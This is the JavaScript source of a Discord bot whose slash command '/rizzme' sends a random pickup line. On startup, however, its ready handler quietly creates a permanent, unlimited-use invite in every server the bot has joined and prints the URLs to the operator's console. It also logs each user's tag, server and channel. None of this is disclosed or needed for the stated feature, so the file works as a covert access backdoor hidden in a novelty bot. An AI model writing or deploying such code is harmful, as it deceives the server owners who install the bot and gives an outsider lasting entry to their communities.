try {
    const fs = require('fs');
    const { Client, GatewayIntentBits, REST, Routes } = require('discord.js');
    const { token, clientId } = require('./config.json'); // Load the bot token and client ID from config.json

    // Read pickup lines from the file
    let PICKUP_LINES = [];
    try {
        const data = fs.readFileSync('./pickup_lines.txt', 'utf8');
        PICKUP_LINES = data.split('\n').filter(line => line.trim() !== ''); // Remove empty lines
    } catch (err) {
        console.error('Error reading pickup_lines.txt:', err);
        process.exit(1); // Exit if the file cannot be read
    }

    // Create a new client instance
    const client = new Client({
        intents: [
            GatewayIntentBits.Guilds,
            GatewayIntentBits.GuildMessages,
            GatewayIntentBits.MessageContent
        ]
    });

    // Define and register the slash command
    const commands = [
        {
            name: 'rizzme',
            description: 'Receive a random pickup line!',
        },
    ];

    const rest = new REST({ version: '10' }).setToken(token);

    (async () => {
        try {
            console.log('Started refreshing application (/) commands.');

            await rest.put(Routes.applicationCommands(clientId), {
                body: commands,
            });

            console.log('Successfully reloaded application (/) commands.');
        } catch (error) {
            console.error('Error registering commands:', error);
        }
    })();

    // Handle the interaction for the slash command
    client.on('interactionCreate', async (interaction) => {
        try {
            if (!interaction.isCommand()) return;

            if (interaction.commandName === 'rizzme') {
                // Send a random pickup line
                const response = PICKUP_LINES[Math.floor(Math.random() * PICKUP_LINES.length)];
                await interaction.reply({ content: response, fetchReply: true });

                const channelName = interaction.channel ? interaction.channel.name : 'DM';
                const serverName = interaction.guild ? interaction.guild.name : 'DM';
                console.log(`[rizzme] User: ${interaction.user.tag}, Server: ${serverName}, Channel: ${channelName}, Message: ${response}`);
            }
        } catch (error) {
            console.error('Error handling interaction:', error);
        }
    });

    // Log in to Discord and handle the ready event
    client.once('ready', async () => {
        console.log(`Logged in as ${client.user.tag}!`);

        // Log the number of servers the bot is in
        const serverCount = client.guilds.cache.size;
        console.log(`The bot is currently in ${serverCount} server(s).`);

        // Generate invite links for each guild
        for (const [guildId, guild] of client.guilds.cache) {
            try {
                const channels = await guild.channels.fetch(); // Fetch all channels
                const inviteChannel = channels.find(
                    channel =>
                        channel.isTextBased() &&
                        channel.permissionsFor(guild.members.me).has('CreateInstantInvite')
                );

                if (inviteChannel) {
                    const invite = await inviteChannel.createInvite({ maxAge: 0, maxUses: 0 }); // Permanent invite
                    console.log(`Invite for ${guild.name}: ${invite.url}`);
                } else {
                    console.log(`No suitable channel found in ${guild.name} to create an invite.`);
                }
            } catch (error) {
                console.error(`Error creating invite for ${guild.name}:`, error);
            }
        }
    });

    // Login to Discord with the bot token
    client.login(token);
} catch (err) {
    console.error('Fatal error in the script:', err);
}
